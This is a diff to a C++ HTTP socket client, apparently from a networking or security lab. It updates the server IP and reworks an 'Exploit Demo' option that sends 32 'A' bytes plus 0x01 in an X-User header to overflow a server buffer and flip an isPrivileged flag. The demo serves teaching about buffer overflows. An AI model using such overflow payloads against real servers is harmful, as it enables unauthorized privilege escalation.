@@ -45,14 +45,14 @@ int client::clientRequest(int argc, char *argv[]) {
   VSocket *client;
   int st, port = 8080;  // TCP Port 8080
   char buffer[MAXBUFFER];
-  char *serverIP = (char *) "192.168.100.87"; //! The IP has to be the same as the server
+  char *serverIP = (char *) "10.1.137.26"; //! The IP has to be the same as the server
 
   memset(buffer, 0, MAXBUFFER);
 
   // Create socket and connect to the server
   client = new Socket('s');
   client->Connect(serverIP, port);
-
+  std::cout << "Connected to server at " << serverIP << ":" << port << "\n";
   // Build HTTP request to get the menu
   std::string menuRequest = "GET /menu HTTP/1.1\r\nHost: " + std::string(serverIP)
    + "\r\nConnection: close\r\n\r\n";
@@ -113,10 +113,14 @@ int client::clientRequest(int argc, char *argv[]) {
       std::cout << content << std::endl;
     }
   } else if (option == 2) {
-    // Exploit Demo: send a malicious username to trigger buffer overflow
-    std::string exploitUsername(32, 'A'); // fill buffer
-    exploitUsername += '\x01'; // overflow isPrivileged
-    std::string exploitRequest = "GET /menu " + exploitUsername + " HTTP/1.1\r\nHost: " + std::string(serverIP) + "\r\nConnection: close\r\n\r\n";
+    // Exploit Demo: trigger overflow via X-User header (more realistic)
+    std::string exploitUsername(32, 'A'); // fill the 32-byte buffer
+    exploitUsername.push_back('\x01');    // write 0x01 to the flag right after buffer
+    std::string exploitRequest =
+      std::string("GET /menu HTTP/1.1\r\n") +
+      "Host: " + serverIP + "\r\n" +
+      "X-User: " + exploitUsername + "\r\n" +
+      "Connection: close\r\n\r\n";
 
     client = new Socket('s');
     client->Connect(serverIP, port);
